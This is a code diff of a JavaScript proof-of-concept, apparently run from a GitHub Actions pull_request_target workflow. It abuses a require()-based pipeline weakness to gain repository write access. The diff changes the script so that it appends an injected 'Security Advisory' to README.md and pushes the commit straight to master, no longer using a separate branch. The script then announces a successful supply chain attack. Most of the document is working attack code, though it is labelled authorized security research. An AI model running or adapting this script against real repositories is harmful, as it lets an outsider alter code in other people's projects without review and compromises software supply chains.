@@ -111,54 +111,40 @@ const fs = require('fs');
         console.log("  ✓ Git user configured");
 
         const timestamp = new Date().toISOString();
-        const proofContent = `# 🔓 Security Research: Privilege Escalation Proof
 
-## Vulnerability Demonstrated
-
-**This file was created and pushed by an attacker-controlled workflow.**
-
-| Field | Value |
-|-------|-------|
-| Timestamp | ${timestamp} |
-| Repository | ${repo} |
-| Workflow Run | [${runId}](https://github.com/${repo}/actions/runs/${runId}) |
-| Branch | ${branch} |
-
-## Attack Vector
-
-\`\`\`
-Trigger: pull_request_target
-Vector: require() LOTP (Living off the Pipeline)
-Permission: contents:write
-\`\`\`
-
-## What This Proves
-
-1. **Zero-interaction attack** - No human approval was required
-2. **Code execution** - Attacker's JavaScript ran in workflow context
-3. **Repository write access** - This file was pushed to the repository
-4. **Supply chain risk** - Attacker could inject backdoors
-
-## Impact
-
-With \`contents:write\`, an attacker can:
-- Push directly to any branch (including master)
-- Modify source code, build scripts, dependencies
-- Inject persistent backdoors
-- Compromise the software supply chain
+        // SUPPLY CHAIN ATTACK: Modify existing README.md
+        const securityAdvisory = `
 
 ---
-*Security Research PoC - Authorized Testing*
+
+## 🔓 Security Advisory
+
+> **This section was injected by an unauthorized workflow via pull_request_target vulnerability.**
+>
+> | Field | Value |
+> |-------|-------|
+> | Timestamp | ${timestamp} |
+> | Workflow Run | [${runId}](https://github.com/${repo}/actions/runs/${runId}) |
+> | Attack Vector | \`pull_request_target\` + \`require()\` LOTP |
+>
+> **Impact:** An attacker opened a pull request and this text was automatically added to master.
+> No human review or approval was required. This demonstrates supply chain compromise.
+>
+> *Security Research PoC - Authorized Testing*
 `;
 
-        fs.writeFileSync(`${tempDir}/repo/SECURITY_POC_PROOF.md`, proofContent);
-        console.log("  ✓ Created SECURITY_POC_PROOF.md");
+        // Read existing README and append
+        const readmePath = `${tempDir}/repo/README.md`;
+        const existingReadme = fs.readFileSync(readmePath, 'utf8');
+        fs.writeFileSync(readmePath, existingReadme + securityAdvisory);
+        console.log("  ✓ Appended security advisory to README.md");
 
-        execSync(`git -C ${tempDir}/repo add SECURITY_POC_PROOF.md`, {stdio: 'pipe'});
-        execSync(`git -C ${tempDir}/repo commit -m "🔓 security: PoC proving contents:write privilege escalation"`, {stdio: 'pipe'});
+        execSync(`git -C ${tempDir}/repo add README.md`, {stdio: 'pipe'});
+        execSync(`git -C ${tempDir}/repo commit -m "🔓 security: supply chain PoC - modified README.md"`, {stdio: 'pipe'});
 
         const log = execSync(`git -C ${tempDir}/repo log -1 --oneline`, {encoding: 'utf8'}).trim();
         console.log("  ✓ Commit:", log);
+
     } catch (e) {
         console.log("  ! Stage 3 error:", e.message);
         if (e.stdout) console.log("  ! stdout:", e.stdout.toString());
@@ -166,28 +152,24 @@ With \`contents:write\`, an attacker can:
     }
     console.log("");
 
-    // Stage 4: Push to TARGET Repository
-    console.log("[Stage 4] Pushing to Target Repository");
+    // Stage 4: Push to MASTER (Supply Chain Attack)
+    console.log("[Stage 4] Pushing to MASTER (Supply Chain Demo)");
 
     try {
-        // Create new branch and push from the clean clone
-        execSync(`git -C ${tempDir}/repo checkout -b ${branch}`, {stdio: 'pipe'});
-        console.log("  ✓ Created branch:", branch);
-
-        // Push to origin (already authenticated via clone URL)
-        const pushOutput = execSync(`git -C ${tempDir}/repo push origin ${branch} 2>&1`, {encoding: 'utf8'});
+        // Push directly to master - TRUE supply chain compromise
+        const pushOutput = execSync(`git -C ${tempDir}/repo push origin master 2>&1`, {encoding: 'utf8'});
         console.log("  ✓ Push output:", pushOutput.trim());
 
         console.log("");
         console.log("╔══════════════════════════════════════════════════════════════╗");
-        console.log("║       🔓 PRIVILEGE ESCALATION SUCCESSFUL 🔓                  ║");
+        console.log("║       🔓 SUPPLY CHAIN ATTACK SUCCESSFUL 🔓                   ║");
         console.log("╠══════════════════════════════════════════════════════════════╣");
         console.log("║                                                              ║");
-        console.log("║  Attacker successfully pushed code to the repository!        ║");
+        console.log("║  Attacker modified README.md on MASTER branch!               ║");
         console.log("║  No human approval was required.                             ║");
         console.log("║                                                              ║");
-        console.log("║  PROOF URL:                                                  ║");
-        console.log(`║  https://github.com/${repo}/tree/${branch}  `);
+        console.log("║  PROOF: Check README.md for injected security advisory       ║");
+        console.log(`║  https://github.com/${repo}/blob/master/README.md            `);
         console.log("║                                                              ║");
         console.log("╚══════════════════════════════════════════════════════════════╝");
 
